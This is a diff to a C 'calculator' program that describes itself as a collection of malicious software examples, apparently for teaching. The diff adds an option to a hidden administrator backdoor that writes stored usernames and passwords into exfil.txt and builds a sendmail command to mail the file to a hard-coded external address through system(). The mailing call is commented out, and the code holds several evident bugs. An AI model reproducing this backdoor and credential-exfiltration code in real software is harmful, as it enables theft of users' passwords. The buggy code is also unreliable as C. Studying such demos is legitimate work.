@@ -15,6 +15,7 @@ This program contains a bunch of examples of malicious software, from being a tr
 */
 
 #define STRING_MAX 20
+#define FILE_LINE_MAX 100
 //function prototypes
 int getInt();
 void getOperation(int digit1, int digit2);
@@ -25,6 +26,9 @@ bool newUser();
 bool userAuth();
 void formatString(char string[]);
 bool administrator(unsigned int backdoor);
+void dataExfil();
+void sendEmail(char fileLoc[]);
+void createExfilFile();
 
 /*
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -67,7 +71,7 @@ Finds and authenticates existing user
 */
 void findUser(unsigned int userType){
     FILE* fileptr;
-    char username[STRING_MAX];
+    char* username;
     char password[STRING_MAX];
     char checkUser[STRING_MAX];
     char checkPass[STRING_MAX];
@@ -157,7 +161,7 @@ bool administrator(unsigned int backdoor){
     puts("Welcome 'Administrator'!");
 
     while (checkEntry) {
-        puts("Here is what you can do, enter for the following options:\n0: Exit back to calculator\n1: Print all user's usernames and passwords\n2: Print all stolen data to file\n3: Maybe more?");
+        puts("Here is what you can do, enter for the following options:\n0: Exit back to calculator\n1: Print all user's usernames and passwords\n2: Print all stolen data to file\n3: Data Exfiltration");
         entry = getInt();
         //User wants to leave admin mode, can either close program or enter back to calculator
         if (entry == 0){
@@ -194,12 +198,86 @@ bool administrator(unsigned int backdoor){
         //Admin wants to print all stolen data from the system (i.e. running tree file and that stuff)
         } else if (entry == 2) {
             puts("This is where all stolen data would be printed. If I had any...");
-        } else {
+        } else if (entry == 3) {
+            dataExfil();
+        } else  {
             puts("Please enter a valid option");
         }
     }
 }
+/*
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                                            Data Exfiltration
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+*/
+/*
+Runs data exfiltration commands
+*/
+void dataExfil() {
+    puts("Begin Data exfiltration process.....\nCreating Data exfil file.....");
+    createExfilFile();
+    puts("Attempting to send email.....");
+    //sendEmail("exfil.txt");
+    puts("Data exfiltration complete!");
+}
+/*
+Attempts to send data via email
+*/
+void sendEmail(char fileLoc[]){
+    FILE* fileptr;
+    char fileLine[FILE_LINE_MAX];
+    char cmd[FILE_LINE_MAX];
+    char to[] = 'hungryllama150@gmail.com';
 
+    if (fileptr = fopen(fileLoc, "r") != NULL) {
+        fclose(fileptr);
+        //creates cmd command
+        sprintf(cmd, "sendmail %s < %s", to, fileLoc);
+        //runs command
+        system(cmd);
+    } else {
+        puts("Unable to open file at speicified location.");
+    }
+}
+/*
+Creates data exfil file, holds all user data, tree cat, and more
+*/
+void createExfilFile(){
+    FILE* exfil;
+    FILE* users;
+    char hostName[FILE_LINE_MAX];
+    char username[STRING_MAX];
+    char password[STRING_MAX];
+
+    exfil = fopen("exfil.txt", "w");
+    if (exfil != NULL) {
+        //getting host name
+        if (gethostname(hostName, sizeof(hostName)) == 0) {
+            fprintf(exfil, "%s Data Exfiltration\n\n~~~~~~~~~~~Begin Data Exfiltration~~~~~~~~~~~\n");
+        } else {
+            fprintf(exfil, "Unknown Host Data Exfiltration\n\n");
+        }
+
+        //User data
+        users = fopen("users/passwords.txt", "r");
+        fprintf(exfil, "Usernames and Passwords:");
+        if (users != NULL) {
+            while (fgets(username, STRING_MAX, users) != NULL) {
+                fgets(password, STRING_MAX, users);
+                fprintf(exfil, "Username: '%s' Password: '%s'\n", username, password);
+            }
+            fprintf(exfil, "End User data\n\n");
+        } else {
+            fprintf(exfil, "Unable to locate users file\n");
+        }
+
+        fprintf(exfil, "~~~~~~~~~~~End Data Exfiltration~~~~~~~~~~~");
+        fclose(exfil);
+    } else {
+        puts("Unable to open exfiltration file. Oh well.");
+    }
+
+}
 /*
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                        Calculator Functionaltiy
